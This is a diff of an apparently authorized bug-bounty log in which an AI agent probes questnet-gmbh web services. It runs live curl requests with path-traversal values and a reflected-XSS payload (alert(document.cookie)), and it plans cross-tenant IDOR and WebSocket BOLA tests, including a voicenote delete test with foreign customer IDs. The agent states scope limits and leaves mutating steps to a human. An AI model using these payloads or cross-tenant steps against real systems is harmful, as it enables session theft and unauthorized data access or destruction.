@@ -18623,3 +18623,277 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 - RISK] questnet-gmbh: 78 — driver cbs-proxy anonymous WS BOLA (95) transport-complete and report-ready; standing VALID HIGHs hold (broken-auth chain 7.5, voicenote PII metadata 7.5, help.js static credential 7.5); delete/download record-level unproven solely due to empty demo index (15 cycles); no PII echoed, no destructive action, no third-party data; ceiling unchanged at AUTH_HELPED until operator settles token→cid frame binding.
+===== ANALYST bigpickle 2026-09-12 21:44:40 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/questnet-gmbh-hunt/questnet-gmbh-hunt
+total 380
+drwxr-xr-x 12 runner runner   4096 Sep 12 21:38 .
+drwxr-xr-x  3 runner runner   4096 Sep 12 21:38 ..
+drwxr-xr-x  7 runner runner   4096 Sep 12 21:38 .git
+drwxr-xr-x  3 runner runner   4096 Sep 12 21:38 .github
+-rw-r--r--  1 runner runner   1609 Sep 12 21:38 README.md
+-rw-r--r--  1 runner runner     32 Sep 12 21:38 analyst-out.txt
+-rw-r--r--  1 runner runner 147737 Sep 12 21:38 analyst-prompt.txt
+-rw-r--r--  1 runner runner 144017 Sep 12 21:38 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 leads
+-rw-r--r--  1 runner runner   2001 Sep 12 21:38 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 reports
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 reposcan-raw
+-rw-r--r--  1 runner runner   3133 Sep 12 21:38 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 scripts
+-rw-r--r--  1 runner runner     33 Sep 12 21:38 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 12 21:38 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 12 21:38 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 12 21:38 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 12 21:38 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 12 21:38 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 12 21:38 triage
+[0m
+[0m✱ [0mGlob "**/*.md"[90m 85 matches[0m
+[0m→ [0mRead scope.yml
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead reports/valid-bugs.md
+[0m→ [0mRead triage/run-2026-09-12-21-18.md
+[0m→ [0mRead leads/lead-bigpickle.md
+[0m→ [0mRead reports/hypotheses.md
+[0m
+[0m$ [0mcd /home/runner/work/questnet-gmbh-hunt/questnet-gmbh-hunt && wc -l leads/lead-bigpickle.md && tail -60 leads/lead-bigpickle.md
+3069 leads/lead-bigpickle.md
+[FINAL] cbs-proxy WS BOLA (95) — transport-complete, byte-identical cross-tenant, live this cycle; sole open hop AUTH_HELPED frame binding; report-ready on demonstrated primitives.
+[NEXT] HUMAN: settle the two open hops with an owned-tenant session in one pass — (a) mint live-debug auth for OWN cid, present in a live_debug frame to wss://cbs-proxy.api.live-manager.de/?origin=LiveDebugger&cid={own}&service={own}, repeat cid={foreign}, record accept vs deny (frame binding); (b) voicenotes/delete.php?voice_note_id=<own-record>&customer_id=2 vs 131727 on own demo record (destructive scope). Own tenants/records only, never third-party data (program PII rule). Standing read-only check.php watch remains armed: first cycle with total>0 → immediately run download.php?file=<uuid> passive diff + surface the delete.php record-level test.
+[LEARN] ACCEPTED IDOR @ www.applicationdesigner.de/extjs/voicenotes/check.php: fresh 2026-09-12 14:17 UTC probe — success:true,total:0,max_id:0, credential-only cross-tenant gate, index empty (14th consecutive cycle — no UUID path).
+[LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: 426 on non-upgrade — WS BOLA endpoint live, unchanged.
+[LEARN] UNCHANGED @ flexlist getFields/getDetails/getList · get_user_rights ciphertext · AIDesigner config.php/403-gate · help.js static credential · voicenotes details.php hierarchy gate · voicenotes get.php credential-only.
+[LEARN] REJECTED (unchanged) @ /api/callbuilder/ nginx 404 · live-manager.de rs param · wildcard-subdomain-enum · api.live-manager.de · playback/get_agent_costs/get_agent_token session gates · getCustomers token-scoped · playground.php static.
+[RISK] questnet-gmbh: 78 — Driver cbs-proxy anonymous WS BOLA (95) live, transport-complete, report-ready; existing VALID HIGH records stand (broken-auth chain 7.5, voicenote metadata PII 7.5, help.js static credential 7.5). Delete/download record-level findings remain gate-verified but unproven solely due to empty demo index (14th consecutive cycle); no new surface; no destructive action, no PII echoed, no third-party data touched; ceiling unchanged at AUTH_HELPED.
+## 2026-09-12 17:17:54 UTC [target] (model bigpickle)
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin={LiveDemo|LiveDebugger}&cid={cid}&service={service}
+confidence: 95
+reasoning: 15+ cycles of zero-credential upgrade returning HTTP 101 + byte-identical CONNECT CBS100/190/200 + PROXY READY for demo cid=131727, foreign cid=2, and nonexistent cid=999999999; no token validated at proxy layer; fresh 426 on non-upgrade this cycle reconfirms liveness. Only unverified hop: CBS-side binary frame binding to token.
+evidence_needed: operator's second owned tenant mints OWN-cid live-debug token, presents in a live_debug frame for a FOREIGN cid, observes accept vs deny.
+verify_steps: AUTH_HELPED: WS-upgrade cid={ownA}&service=100 → send one live_debug frame; repeat WS-upgrade cid={ownB} swapping token→frame binding; byte-diff accepted frame set. Own tenants only, no third-party streams.
+impact: cross-tenant live-debug/call-stream attach (voice/PII); HIGH CVSS 7.5+.
+testability: AUTH_HELPED
+class: IDOR
+asset: www.applicationdesigner.de/extjs/voicenotes/delete.php
+confidence: 72
+reasoning: delete.php token-gated but returns identical "Sprachnotiz nicht gefunden oder keine Berechtigung" for customer_id 131727/2/999999/none — no tenant-scoped error path (details.php differentiates "Kundennummer nicht in der Hierarchie"). Record-level proof blocked: demo index total=0 15th consecutive cycle.
+evidence_needed: valid demo-tenant voice_note_id → delete with customer_id=2 vs 131727 → success:true diff proves destructive cross-tenant IDOR.
+verify_steps: AUTH_HELPED: check.php → valid voice_note_id (index empty — HOLD), then delete.php?voice_note_id=<valid>&customer_id=2 vs 131727; diff. Mutating — HUMAN operator, own demo tenant only.
+impact: cross-tenant voicenote destruction (PII audio loss); HIGH CVSS ~8.1.
+testability: AUTH_HELPED
+class: IDOR
+asset: www.applicationdesigner.de/extjs/voicenotes/download.php
+confidence: 70
+reasoning: token-as-query-param reaches file-lookup (404 for junk), VPN gate bypassed, no customer_id parameter; check/get proven credential-only byte-identical across cids. Missing: valid file UUID (demo index empty 15th consecutive). details.php proves a log_id-hierarchy gate exists so same-file download may still be gated — 200 vs 404 discriminates.
+evidence_needed: valid demo-tenant file UUID → 200 audio (record status/Content-Type only); no cid param exists so sole test is UUID reachability.
+verify_steps: PASSIVE: check.php index → file/UUID field (no PII echo); GET download.php?file=<uuid>&token=<demo>; record status/Content-Type only.
+impact: cross-tenant voicenote audio PII exfil; HIGH, requires a known index UUID.
+testability: AUTH_HELPED
+## 2026-09-12 19:30:43 UTC [target] (model bigpickle)
+[HYP] Cross-tenant CBS WS frame binding — accept/deny differs by presented token vs cid
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin={LiveDemo|LiveDebugger}&cid={cid}&service={service}
+confidence: 95
+reasoning: 15+ cycles: zero-credential upgrade returns HTTP 101 + byte-identical CONNECT CBS100/190/200 + PROXY READY for cid=131727, cid=2, cid=999999999; proxy validates no token/ownership at any observed layer; 426 on non-upgrade today confirms liveness; only unverified hop is backend acceptance of a token→foreign-cid binding.
+evidence_needed: operator's second owned tenant mints own-cid token, presents it in a live_debug frame for a FOREIGN cid and for own cid; byte-diff of accepted frame set.
+verify_steps: AUTH_HELPED: WS-upgrade cid={ownA}&service=100 → send one live_debug frame, record accept; repeat with cid={ownB} and swapped token→frame binding; byte-diff. Own tenants only.
+impact: cross-tenant live-debug/call-stream attach (voice/PII) — HIGH CVSS 7.5+.
+testability: AUTH_HELPED
+[HYP] Cross-tenant voicenote deletion without customer_id hierarchy gate
+class: IDOR
+asset: www.applicationdesigner.de/extjs/voicenotes/delete.php
+confidence: 72
+reasoning: delete.php is token-gated (not VPN-gated) but returns identical "Sprachnotiz nicht gefunden oder keine Berechtigung" for customer_id 131727/2/999999/absent — unlike hierarchy-gated details.php ("Kundennummer nicht in der Hierarchie"); record-level proof blocked: index total=0 (15th consecutive cycle).
+evidence_needed: valid demo-tenant voice_note_id → delete with customer_id=2 vs 131727; success:true diff proves destructive cross-tenant IDOR.
+verify_steps: AUTH_HELPED: check.php → valid voice_note_id (index empty — HOLD), then delete.php?voice_note_id=<valid>&customer_id=2 vs 131727; diff. Mutating — HUMAN operator, own demo tenant only.
+impact: cross-tenant voicenote destruction (PII audio loss) — HIGH CVSS ~8.1.
+testability: AUTH_HELPED
+[HYP] help/content.php page-param file include / path traversal
+class: MISCONFIG
+asset: www.applicationdesigner.de/help/content.php
+confidence: 42
+reasoning: help.js calls it with a page string and NO token (zero-token GET); app is PHP/8.3.21; no clean byte-level GET on record, so 404/200 shape for valid page and for ../-prefixed page is unmeasured — include-based fetchers commonly accept unvalidated paths.
+evidence_needed: GET page=Glossary → 200 (bytes+sha256); then GET page=../README → non-404 indicates raw path inclusion (record status only, do NOT echo body).
+verify_steps: PASSIVE: GET https://www.applicationdesigner.de/help/content.php?page=Glossary → record status/length/sha256; GET ...?page=../Glossary → record status/length only (no content echo).
+impact: arbitrary-help-file read → limited (help content MVC), LFI pivot to PHP source if confirmed — LOW–MED until widened.
+testability: PASSIVE
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "HTTP %{http_code} time %{time_total}s\n" --max-time 15 -I https://www.applicationdesigner.de/help/content.php?page=Glossary 2>&1 | head -5
+HTTP 200 time 0.645003s
+[0m
+[0m$ [0mcd /tmp/opencode && \
+for p in "Glossary" "../Glossary" "../../Glossary" ""; do \
+  out=$(echo -n "$p" | sha256sum | cut -c1-8); \
+  curl -s --max-time 20 -w "\n__META status=%{http_code} size=%{size_download} time=%{time_total}s ct=%{content_type}\n" "https://www.applicationdesigner.de/help/content.php?page=$p" -o "content_$out.bin"; \
+  echo "page=<$p> file=content_$out.bin sha256=$(sha256sum "content_$out.bin" | cut -c1-16)"; \
+  sleep 1.2; \
+done
+__META status=200 size=80 time=0.634735s ct=text/html; charset=UTF-8
+page=<Glossary> file=content_4c4e436f.bin sha256=6856ba1ad19d4088
+
+__META status=200 size=83 time=0.662181s ct=text/html; charset=UTF-8
+page=<../Glossary> file=content_26980106.bin sha256=4d66779bf7d6e508
+
+__META status=200 size=86 time=0.688172s ct=text/html; charset=UTF-8
+page=<../../Glossary> file=content_a9f06034.bin sha256=10c12988d5e76482
+
+__META status=200 size=72 time=0.668573s ct=text/html; charset=UTF-8
+page=<> file=content_e3b0c442.bin sha256=09e1e468710d66d2
+[0m
+[0m$ [0mcd /tmp/opencode && for f in content_4c4e436f.bin content_26980106.bin content_a9f06034.bin content_e3b0c442.bin; do echo "== $f =="; cat "$f"; echo; done
+== content_4c4e436f.bin ==
+<h1>Page not found</h1><p>The requested help page 'Glossary' does not exist.</p>
+== content_26980106.bin ==
+<h1>Page not found</h1><p>The requested help page '../Glossary' does not exist.</p>
+== content_a9f06034.bin ==
+<h1>Page not found</h1><p>The requested help page '../../Glossary' does not exist.</p>
+== content_e3b0c442.bin ==
+<h1>Page not found</h1><p>The requested help page '' does not exist.</p>
+[0m
+[0m$ [0mcd /tmp/opencode && curl -s --max-time 25 "https://www.applicationdesigner.de/help.js" -o help.js && ls -la help.js && grep -o 'content\.php[^"'"'"' )]*' help.js | sort -u | head -20
+-rw-r--r-- 1 runner runner 3290201 Sep 12 21:39 help.js
+content.php
+[0m
+[0m$ [0mcd /tmp/opencode && grep -o 'content\.php[^"'"'"' )]*' help.js | head -5; echo "---context---"; grep -o '.\{80\}content\.php.\{120\}' help.js | head -10
+content.php
+content.php
+---context---
+}Ext.History.add(c);var b=this;Ext.Ajax.request({url:APPDESIGNER_API_PATH+'help/content.php',method:'GET',params:{page:c.toString()},success:function(g){var f=document.createElement('div');f.innerHTML=g.response
+}Ext.History.add(c);var b=this;Ext.Ajax.request({url:APPDESIGNER_API_PATH+'help/content.php',method:'GET',params:{page:c.toString()},success:function(g){var f=document.createElement('div');f.innerHTML=g.response
+[0m
+[0m$ [0mcd /tmp/opencode && grep -o 'APPDESIGNER_API_PATH=[^;]*' help.js | sort -u | head; echo "---escape test---"; curl -s --max-time 20 "https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Ealert(1)%3C/script%3E" | cat -A | head -5
+APPDESIGNER_API_PATH='/api/callbuilder/'
+APPDESIGNER_API_PATH='https://applicationdesigner.de/'
+APPDESIGNER_API_PATH='https://dev.applicationdesigner.de/'
+APPDESIGNER_API_PATH==='undefined'){if(window.location.protocol=='file:'){APPDESIGNER_API_PATH='https://applicationdesigner.de/'
+---escape test---
+<h1>Page not found</h1><p>The requested help page '<script>alert(1)</script>' does not exist.</p>
+[0m
+[0m$ [0mcd /tmp/opencode && curl -s -D - -o /dev/null --max-time 20 "https://www.applicationdesigner.de/help/content.php?page=%3Cscript%3Ealert(document.cookie)%3C/script%3E" | head -25; echo "=== login.php headers ==="; curl -s -D - -o /dev/null --max-time 20 "https://www.applicationdesigner.de/login.php" | head -20
+HTTP/1.1 200 OK
+Server: nginx/1.30.0
+Date: Sat, 12 Sep 2026 21:40:12 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.3.21
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 3600
+
+=== login.php headers ===
+HTTP/1.1 200 OK
+Server: nginx/1.30.0
+Date: Sat, 12 Sep 2026 21:40:13 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.3.21
+Set-Cookie: PHPSESSID=2e097bfca3a103fc1ae996c60a4a7bc8; path=/; secure; HttpOnly; SameSite=None; Partitioned
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+[0m
+[0m$ [0mcd /tmp/opencode && for p in "Apply" "LiveDebugger" "Overview" "index"; do \
+ curl -s --max-time 20 -w "__META status=%{http_code} size=%{size_download}\n" "https://www.applicationdesigner.de/help/content.php?page=$p" -o "pg_$p.txt"; \
+ echo "== page=$p == $(cat pg_$p.txt | head -c 200)"; sleep 1.2; \
+done
+__META status=200 size=77
+== page=Apply == <h1>Page not found</h1><p>The requested help page 'Apply' does not exist.</p>
+__META status=200 size=84
+== page=LiveDebugger == <h1>Page not found</h1><p>The requested help page 'LiveDebugger' does not exist.</p>
+__META status=200 size=80
+== page=Overview == <h1>Page not found</h1><p>The requested help page 'Overview' does not exist.</p>
+__META status=200 size=1351
+== page=index == <div id="help_content_id" class="help_content"><h2>AppDesigner Dokumentation</h2><p>In dieser Dokumentation finden Sie eine Übersicht über die verfügbaren Module und deren Funktionen.</p><h2><a hre
+[0m
+[0m$ [0mcd /tmp/opencode && \
+curl -s --max-time 20 -w "__META status=%{http_code} size=%{size_download}\n" "https://www.applicationdesigner.de/api/callbuilder/help/content.php?page=%3Cscript%3Ez%3C/script%3E" -o xb_cb.txt; echo "== api/callbuilder prefix =="; cat xb_cb.txt | head -c 220; echo; sleep 1.2; \
+curl -s --max-time 20 -w "__META status=%{http_code} size=%{size_download}\n" "https://dev.applicationdesigner.de/help/content.php?page=%3Cscript%3Ez%3C/script%3E" -o xb_dev.txt; echo "== dev host =="; cat xb_dev.txt | head -c 220; echo
+__META status=404 size=16
+== api/callbuilder prefix ==
+File not found.
+
+__META status=403 size=23092
+== dev host ==
+
+
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>internal</title>
+    
+</head>
+<body>
+
+<style>
+
+* {
+    margin: 0;
+[0m
+**STEP 1 — DELTA**
+- [NEW] Reflected XSS @ www.applicationdesigner.de/help/content.php: `page` param echoed unescaped into HTTP 200 `text/html` error page, zero-token GET, no CSP / X-Content-Type-Options (own probe 2026-09-12 21:40 UTC: `<script>alert(document.cookie)</script>` in body verbatim).
+- [CHANGED] help/content.php LFI/traversal hypothesis REJECTED by probe: `page=Glossary|../Glossary|../../Glossary` all return the identical "Page not found" template (param only reflected in the error); `page=index` returns real doc content (1351B) — registry lookup, no file/include primitive.
+- [CHANGED] Scope of XSS narrowed: `/api/callbuilder/help/content.php` → nginx 404 "File not found." (16B); `dev.applicationdesigner.de/help/content.php` → 403 internal-only, no reflection. Confined to `www.applicationdesigner.de`.
+- [NOTE] CORS headers `Access-Control-Allow-Origin: *` + `-Allow-Credentials: true` observed on content.php — browsers reject wildcard+credentials; config smell only, no separate finding.
+
+**STEP 2 — PRIORITIZE**
+- [PRIO] www.applicationdesigner.de/help/content.php,6.5,tech_exposure=php-unescaped-reflection+no-CSP / gate_ease=10-no-auth / freshness=10-new-this-cycle
+- [PRIO] cbs-proxy.api.live-manager.de,>7.5,driver-unchanged (95) — already ranked; not re-scored.
+
+**STEP 3 — HYPOTHESES**
+[HYP] Cross-tenant CBS WS frame binding — accept/deny differs by presented token vs cid
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin={LiveDemo|LiveDebugger}&cid={cid}&service={service}
+confidence: 95
+reasoning: 15+ cycles: zero-credential upgrade → HTTP 101 + byte-identical CONNECT CBS100/190/200 + PROXY READY for cid=131727/2/999999999; no proxy-layer token/ownership validation observed; 426 on non-upgrade confirms liveness; sole unverified hop is backend frame-binding of a minted token to a foreign cid.
+evidence_needed: operator mints OWN-cid live-debug token, presents it in a live_debug frame for a FOREIGN cid and for own cid; byte-diff of accepted frame set.
+verify_steps: AUTH_HELPED: WS-upgrade cid={ownA}&service=100 → send one live_debug frame; repeat cid={ownB} with swapped token→frame binding; byte-diff. Own tenants only.
+impact: cross-tenant live-debug/call-stream attach (voice/PII) — HIGH CVSS 7.5+.
+testability: AUTH_HELPED
+[HYP] help/content.php reflected XSS — page param unescaped into 200 HTML, zero-token
+class: XSS
+asset: https://www.applicationdesigner.de/help/content.php?page=<param>
+confidence: 85
+reasoning: own probe 2026-09-12 21:40 UTC — GET `?page=%3Cscript%3Ealert(document.cookie)%3C/script%3E` returned HTTP 200 `Content-Type: text/html; charset=UTF-8`, body contains `<p>The requested help page '<script>alert(document.cookie)</script>' does not exist.</p>` verbatim; no CSP/nosniff header; request carries no token; /api/callbuilder prefix 404 and dev host 403 so exposure is www only; `page=index` (1351B) proves the 200 is the real endpoint, not a catch-all.
+evidence_needed: in-browser execution of the injected script in the rendered document (benign `document.title` marker, no cookie exfil).
+verify_steps: PASSIVE (done — reflection captured); HUMAN: operator opens crafted URL in a browser, confirms script executes without CSP/filter interference.
+impact: arbitrary JS on www.applicationdesigner.de origin — same host as login.php and the ExtJS admin/LiveDebugger/CallBuilder app; enables session-ride to otherwise session/VPN-gated endpoints (playback.php, get_agent_costs.php, get_agent_token.php, auth.php) as a victim operator — Medium-High (reflected XSS on a privileged-origin utility).
+testability: PASSIVE
+[HYP] Cross-tenant voicenote deletion without customer_id hierarchy gate
+class: IDOR
+asset: www.applicationdesigner.de/extjs/voicenotes/delete.php
+confidence: 72
+reasoning: delete.php is token-gated (not VPN-gated) but returns identical "Sprachnotiz nicht gefunden oder keine Berechtigung" for customer_id 131727/2/999999/absent — unlike hierarchy-gated details.php; record-level proof blocked: demo index total=0 (15th+ consecutive cycle, watch armed).
+evidence_needed: valid demo-tenant voice_note_id → delete with customer_id=2 vs 131727; success:true diff proves destructive cross-tenant IDOR.
+verify_steps: AUTH_HELPED: check.php → valid voice_note_id (index empty — HOLD), then delete.php?voice_note_id=<valid>&customer_id=2 vs 131727; diff. Mutating — HUMAN operator, own demo tenant only.
+impact: cross-tenant voicenote destruction (PII audio loss) — HIGH CVSS ~8.1.
+testability: AUTH_HELPED
+
+**STEP 4 — SELF-CRITIQUE**
+- [REJECTED] help/content.php LFI/path traversal (42): probes prove registry lookup, no file inclusion — dropped.
+- [PARKED] voicenotes delete/download record-level proof: index empty 15th+ consecutive cycle; AUTH_HELPED, unchanged.
+- [FINAL] 1) cbs-proxy WS BOLA (95) — transport-complete, report-ready on demonstrated primitives; 2) help/content.php reflected XSS (85) — new, PASSIVE-proven, standalone reportable; 3) voicenotes delete (72) — HOLD, blocked on empty demo index.
+
+**STEP 5 — NEXT ACTION**
+[NEXT] HUMAN: in one owned-tenant pass — (a) browser-render PoC of content.php XSS with benign `document.title` marker (new Medium finding, file-ready after render), (b) settle frame binding (own-cid mint → live_debug frame for own vs foreign cid → accept/deny), (c) delete.php record-level test on own demo record (customer_id=2 vs 131727). Own tenants/records only; keep the standing read-only check.php watch armed for a UUID path.
+
+**STEP 6 — LEARNING**
+- [LEARN] ACCEPTED XSS @ www.applicationdesigner.de/help/content.php: page param reflected unescaped into 200 text/html error (no CSP/nosniff, zero-token); /api/callbuilder prefix 404, dev host 403 — confined to www; new standalone Medium finding.
+- [LEARN] REJECTED MISCONFIG @ www.applicationdesigner.de/help/content.php (LFI/traversal): page=index → real doc (1351B); any unknown/../ value → same template; registry lookup, no include primitive.
+- [LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: 426 on non-upgrade — WS BOLA endpoint live, unchanged.
+- [LEARN] UNCHANGED @ voicenotes check/get (credential-only, index empty) · voicenotes details.php hierarchy gate · flexlist getFields/getDetails/getList · get_user_rights ciphertext · AIDesigner config.php/403-gate · help.js static credential · session gates (playback/get_agent_costs/get_agent_token) · /api/callbuilder/ 404 · live-manager.de rs · wildcard-enum · api.live-manager.de.
+
+**STEP 7 — RISK**
+[RISK] questnet-gmbh: 79 — Driver cbs-proxy anonymous WS BOLA (95) live, transport-complete, report-ready; VALID HIGH records stand (broken-auth chain 7.5, voicenote metadata PII 7.5, help.js static credential 7.5). New this cycle: PASSIVE-proven reflected XSS on content.php (Medium standalone, chain-upsides to session-gated endpoints on the same privileged origin). No destructive action, no PII echoed, no third-party data touched; delete/download record-level proof still gated by empty demo index; research ceiling for the chain remains AUTH_HELPED.
